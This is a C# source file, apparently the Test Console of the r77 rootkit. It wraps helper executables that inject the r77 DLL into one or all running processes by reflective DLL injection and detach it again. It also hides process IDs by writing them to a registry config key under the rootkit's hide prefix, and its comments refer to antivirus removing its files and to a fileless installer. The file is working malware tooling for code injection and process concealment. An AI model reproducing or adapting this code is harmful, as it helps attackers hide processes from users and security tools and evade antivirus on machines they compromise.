using BytecodeApi;
using BytecodeApi.Extensions;
using BytecodeApi.IO;
using Global;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace TestConsole
{
	/// <summary>
	/// Interface to inject r77 to or detach r77 from running processes.
	/// </summary>
	public static class ProcessList
	{
		/// <summary>
		/// Injects the specified process with the r77 DLL using reflective DLL injection.
		/// <para>Inject32.exe or Inject64.exe is invoked to perform injection.</para>
		/// </summary>
		/// <param name="process">The process to inject.</param>
		/// <returns>
		/// An enumerable of <see cref="LogMessage" /> entries to be displayed in the log view.
		/// </returns>
		public static IEnumerable<LogMessage> Inject(ProcessView process)
		{
			string injectPath = GetFilePath(process.Is64Bit == true ? "Inject64.exe" : "Inject32.exe", out LogMessage injectPathLogMessage);
			if (injectPath == null)
			{
				yield return injectPathLogMessage;
				yield break;
			}

			string dllPath = GetFilePath(process.Is64Bit == true ? "r77-x64.dll" : "r77-x86.dll", out LogMessage dllPathLogMessage);
			if (dllPath == null)
			{
				yield return dllPathLogMessage;
				yield break;
			}

			if (!Win32.IsProcessRunning(process.Id))
			{
				yield return new LogMessage
				(
					LogMessageType.Warning,
					new LogFileItem(process.Name),
					new LogTextItem("(PID " + process.Id + ") is no longer running.")
				);
				yield break;
			}

			if (ProcessEx.Execute(injectPath, process.Id + " \"" + dllPath + "\"") == 0)
			{
				yield return new LogMessage
				(
					LogMessageType.Information,
					new LogTextItem("Injected"),
					new LogFileItem(process.Name),
					new LogTextItem("(PID " + process.Id + ").")
				);
			}
			else
			{
				string reason;
				if (process.Name.StartsWith(Config.HidePrefix)) reason = "The filename starts with '" + Config.HidePrefix + "'.";
				else if (process.IsR77Service) reason = "The process is the r77 service process.";
				else if (process.IsHelper) reason = "The process is a helper process.";
				else if (process.IntegrityLevel < ProcessIntegrityLevel.Medium) reason = "Sandboxes are not supported";
				else reason = Path.GetFileName(injectPath) + " returned an error code.";

				yield return new LogMessage
				(
					LogMessageType.Warning,
					new LogTextItem("Injection of"),
					new LogFileItem(process.Name),
					new LogTextItem("(PID " + process.Id + ") failed."),
					new LogDetailsItem(reason)
				);
			}
		}
		/// <summary>
		/// Detaches r77 from the specified process.
		/// <para>Detach32.exe or Detach64.exe is invoked to call the detach function pointer found in the r77 header.</para>
		/// </summary>
		/// <param name="process">The process to detach.</param>
		/// <returns>
		/// An enumerable of <see cref="LogMessage" /> entries to be displayed in the log view.
		/// </returns>
		public static IEnumerable<LogMessage> Detach(ProcessView process)
		{
			string detachPath = GetFilePath(process.Is64Bit == true ? "Detach64.exe" : "Detach32.exe", out LogMessage detachPathLogMessage);
			if (detachPath == null)
			{
				yield return detachPathLogMessage;
				yield break;
			}

			if (!Win32.IsProcessRunning(process.Id))
			{
				yield return new LogMessage
				(
					LogMessageType.Warning,
					new LogFileItem(process.Name),
					new LogTextItem("(PID " + process.Id + ") is no longer running.")
				);
				yield break;
			}

			if (ProcessEx.Execute(detachPath, process.Id.ToString()) == 0)
			{
				yield return new LogMessage
				(
					LogMessageType.Information,
					new LogTextItem("Detached from"),
					new LogFileItem(process.Name),
					new LogTextItem("(PID " + process.Id + ").")
				);
			}
			else
			{
				yield return new LogMessage
				(
					LogMessageType.Warning,
					new LogTextItem("Detaching of"),
					new LogFileItem(process.Name),
					new LogTextItem("(PID " + process.Id + ") failed.")
				);
			}
		}
		/// <summary>
		/// Injects all processes with the r77 DLL using reflective DLL injection.
		/// <para>Both Inject32.exe and Inject64.exe are invoked using the "-all" commandline.</para>
		/// </summary>
		/// <returns>
		/// An enumerable of <see cref="LogMessage" /> entries to be displayed in the log view.
		/// </returns>
		public static IEnumerable<LogMessage> InjectAll()
		{
			int injectedCount = GetInjectedCount();

			string inject32Path = GetFilePath("Inject32.exe", out LogMessage inject32PathLogMessage);
			if (inject32Path == null)
			{
				yield return inject32PathLogMessage;
				yield break;
			}

			string inject64Path = null;
			if (Environment.Is64BitOperatingSystem)
			{
				inject64Path = GetFilePath("Inject64.exe", out LogMessage inject64PathLogMessage);
				if (inject64Path == null)
				{
					yield return inject64PathLogMessage;
					yield break;
				}
			}


			string dll32Path = GetFilePath("r77-x86.dll", out LogMessage dll32PathLogMessage);
			if (dll32Path == null)
			{
				yield return dll32PathLogMessage;
				yield break;
			}

			string dll64Path = null;
			if (Environment.Is64BitOperatingSystem)
			{
				dll64Path = GetFilePath("r77-x64.dll", out LogMessage dll64PathLogMessage);
				if (dll64Path == null)
				{
					yield return dll64PathLogMessage;
					yield break;
				}
			}

			if (ProcessEx.Execute(inject32Path, "-all \"" + dll32Path + "\"") != 0)
			{
				yield return new LogMessage
				(
					LogMessageType.Error,
					new LogFileItem(Path.GetFileName(inject32Path)),
					new LogTextItem("returned an error code.")
				);
			}

			if (inject64Path != null && dll64Path != null && ProcessEx.Execute(inject64Path, "-all \"" + dll64Path + "\"") != 0)
			{
				yield return new LogMessage
				(
					LogMessageType.Error,
					new LogFileItem(Path.GetFileName(inject64Path)),
					new LogTextItem("returned an error code.")
				);
			}

			int newInjectedCount = GetInjectedCount();

			if (newInjectedCount == injectedCount)
			{
				yield return new LogMessage
				(
					LogMessageType.Information,
					new LogTextItem("No processes were injected")
				);
			}
			else if (newInjectedCount > injectedCount)
			{
				yield return new LogMessage
				(
					LogMessageType.Information,
					new LogTextItem("Injected " + (newInjectedCount - injectedCount) + " processes.")
				);
			}
		}
		/// <summary>
		/// Detaches r77 from all running processes.
		/// <para>Both Detach32.exe and Detach64.exe are invoked using the "-all" commandline.</para>
		/// </summary>
		/// <returns>
		/// An enumerable of <see cref="LogMessage" /> entries to be displayed in the log view.
		/// </returns>
		public static IEnumerable<LogMessage> DetachAll()
		{
			int injectedCount = GetInjectedCount();
			if (injectedCount == 0)
			{
				yield return new LogMessage
				(
					LogMessageType.Information,
					new LogTextItem("No processes are injected.")
				);
				yield break;
			}

			string detach32Path = GetFilePath("Detach32.exe", out LogMessage detach32PathLogMessage);
			if (detach32Path == null)
			{
				yield return detach32PathLogMessage;
				yield break;
			}

			string detach64Path = null;
			if (Environment.Is64BitOperatingSystem)
			{
				detach64Path = GetFilePath("Detach64.exe", out LogMessage detach64PathLogMessage);
				if (detach64Path == null)
				{
					yield return detach64PathLogMessage;
					yield break;
				}
			}

			if (ProcessEx.Execute(detach32Path, "-all") != 0)
			{
				yield return new LogMessage
				(
					LogMessageType.Error,
					new LogFileItem(Path.GetFileName(detach32Path)),
					new LogTextItem("returned an error code.")
				);
			}

			if (detach64Path != null && ProcessEx.Execute(detach64Path, "-all") != 0)
			{
				yield return new LogMessage
				(
					LogMessageType.Error,
					new LogFileItem(Path.GetFileName(detach64Path)),
					new LogTextItem("returned an error code.")
				);
			}

			int newInjectedCount = GetInjectedCount();

			if (newInjectedCount < injectedCount)
			{
				yield return new LogMessage
				(
					LogMessageType.Information,
					new LogTextItem("Detached from " + (injectedCount - newInjectedCount) + " processes.")
				);
			}

			if (newInjectedCount > 0)
			{
				yield return new LogMessage
				(
					LogMessageType.Warning,
					new LogTextItem(newInjectedCount + " processes could not be detached.")
				);
			}
		}
		/// <summary>
		/// Hides a process ID by entering the PID into the r77 configuration system.
		/// </summary>
		/// <param name="process">The process to hide by ID.</param>
		/// <returns>
		/// An enumerable of <see cref="LogMessage" /> entries to be displayed in the log view.
		/// </returns>
		public static IEnumerable<LogMessage> Hide(ProcessView process)
		{
			using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).CreateSubKey(@"Software\" + Config.HidePrefix + @"config\pid"))
			{
				key.SetValue("TestConsole_HiddenPID_" + process.Id, process.Id, RegistryValueKind.DWord);
			}

			yield return new LogMessage
			(
				LogMessageType.Information,
				new LogFileItem(process.Name),
				new LogTextItem("(PID " + process.Id + ") is marked as hidden."),
				new LogDetailsItem(@"(HKEY_CURRENT_USER\" + Config.HidePrefix + @"config\pid)")
			);

			if (process.Name.StartsWith(Config.HidePrefix))
			{
				yield return new LogMessage
				(
					LogMessageType.Warning,
					new LogFileItem(process.Name),
					new LogTextItem("(PID " + process.Id + ") is already hidden by prefix. Hiding the process by ID is unnecessary.")
				);
			}

			if (GetInjectedCount() == 0)
			{
				yield return new LogMessage
				(
					LogMessageType.Warning,
					new LogTextItem("r77 needs to be installed, or at least injected in the task manager to have effect.")
				);
			}
		}
		/// <summary>
		/// Removes a process ID from the r77 configuration system to make the process visible again.
		/// </summary>
		/// <param name="process">The process to unhide.</param>
		/// <returns>
		/// An enumerable of <see cref="LogMessage" /> entries to be displayed in the log view.
		/// </returns>
		public static IEnumerable<LogMessage> Unhide(ProcessView process)
		{
			bool elevationRequired = false;

			// Delete process ID's from HKEY_CURRENT_USER\SOFTWARE\$77config\pid
			using (RegistryKey currentUserKey = GetRegistryKey(false, true))
			{
				if (currentUserKey != null)
				{
					DeleteValues(currentUserKey);
				}
			}

			// Ignore HKEY_USERS (i.e. other users) in the scope of the Test Console.

			// Delete process ID's from HKEY_LOCAL_MACHINE\SOFTWARE\$77config\pid
			using (RegistryKey localMachineKey = GetRegistryKey(true, false))
			{
				// First, check if there are any values to delete.
				if (localMachineKey != null && GetValuesToDelete(localMachineKey).Any())
				{
					if (ApplicationBase.Process.IsElevated)
					{
						// There are values to delete and the process is elevated: Delete values.
						using (RegistryKey localMachineKeyWritable = GetRegistryKey(true, true))
						{
							DeleteValues(localMachineKeyWritable);
						}
					}
					else
					{
						// There are values to delete, but the process is not elevated: Require elevation.
						elevationRequired = true;

						yield return new LogMessage
						(
							LogMessageType.Warning,
							new LogTextItem("To mark"),
							new LogFileItem(process.Name),
							new LogTextItem("(PID " + process.Id + ") as not hidden,"),
							new LogLinkItem("run as administrator", () => MainWindowViewModel.Singleton.ElevateCommand.Execute())
						);
					}
				}
			}

			if (!elevationRequired)
			{
				yield return new LogMessage
				(
					LogMessageType.Information,
					new LogFileItem(process.Name),
					new LogTextItem("(PID " + process.Id + ") is marked as not hidden.")
				);
			}

			RegistryKey GetRegistryKey(bool localMachine, bool writable)
			{
				// Get the registry key to the hidden process ID list in either HKEY_LOCAL_MACHINE or HKEY_CURRENT_USER
				return RegistryKey
					.OpenBaseKey(localMachine ? RegistryHive.LocalMachine : RegistryHive.CurrentUser, RegistryView.Registry64)
					.OpenSubKey(@"Software\" + Config.HidePrefix + @"config\pid", writable);
			}
			void DeleteValues(RegistryKey key)
			{
				foreach (string value in GetValuesToDelete(key))
				{
					key.DeleteValue(value);
				}
			}
			string[] GetValuesToDelete(RegistryKey key)
			{
				// Get all DWORD value names with the process ID as their value.
				return key
					.GetValueNames()
					.Where(name => key.GetValueKind(name) == RegistryValueKind.DWord)
					.Where(name => (int)key.GetValue(name) == process.Id)
					.ToArray();
			}
		}

		private static int GetInjectedCount()
		{
			return ProcessView.GetProcesses().Count(process => process.IsInjected);
		}
		private static string GetFilePath(string filename, out LogMessage message)
		{
			// Gets the path to a file in the application directory.
			// If the file does not exist, return null and a log message.

			// This is a common issue when using the Test Console, because antivirus software may delete some files.
			// However, the installer is fileless and once executed, doesn't have issues with missing files.

			string path = Path.Combine(ApplicationBase.Path, filename);
			if (File.Exists(path))
			{
				message = null;
				return path;
			}
			else
			{
				message = new LogMessage
				(
					LogMessageType.Error,
					new LogTextItem("File"),
					new LogFileItem(Path.GetFileName(path)),
					new LogTextItem("not found."),
					new LogDetailsItem("It might have been removed by antivirus software.")
				);
				return null;
			}
		}
	}
}